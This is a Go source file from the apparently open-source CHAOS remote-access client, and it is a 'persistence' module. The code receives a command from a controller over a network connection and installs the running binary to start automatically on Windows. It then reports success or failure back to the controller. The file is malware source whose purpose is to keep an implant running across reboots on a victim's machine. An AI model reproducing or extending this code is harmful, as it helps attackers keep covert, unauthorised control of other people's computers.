package persistence

import (
	"encoding/json"
	"fmt"
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/client/app/models"
	"github.com/tiagorlampert/CHAOS/client/app/usecase"
	"github.com/tiagorlampert/CHAOS/client/app/usecase/persistence/windows"
	"github.com/tiagorlampert/CHAOS/client/app/util"
	"github.com/tiagorlampert/CHAOS/client/app/util/network"
	"net"
	"os"
)

type PersistenceUseCase struct {
	Connection net.Conn
	BinaryPath string
}

func NewPersistenceUseCase(conn net.Conn) usecase.Persistence {
	return &PersistenceUseCase{
		Connection: conn,
		BinaryPath: os.Args[0],
	}
}

func (p PersistenceUseCase) Persist(data []byte) {
	var persistence models.Persistence
	if err := json.Unmarshal(data, &persistence); err != nil {
		log.WithField("cause", err.Error()).Error("error decoding persistence")
	}

	var errData models.Error
	if err := InstallAtStartup(persistence.Status, p.BinaryPath); err != nil {
		log.WithField("cause", err.Error()).Error("error updating persistence")
		errData.HasError = true
		errData.Message = err.Error()
	}

	if err := network.Send(p.Connection, models.Message{
		Command: "persistence",
		Error:   errData,
	}); err != nil {
		log.WithField("cause", err.Error()).Error("error sending file")
	}
}

func InstallAtStartup(status bool, binaryPath string) error {
	osType := util.DetectOS()
	switch osType {
	case util.Windows:
		return windows.Persist(status, binaryPath)
	case util.Linux:
		return fmt.Errorf(unsupportedOS())
	case util.Darwin:
		return fmt.Errorf(unsupportedOS())
	default:
		return fmt.Errorf(unsupportedOS())
	}
}

func unsupportedOS() string {
	return "os not supported"
}
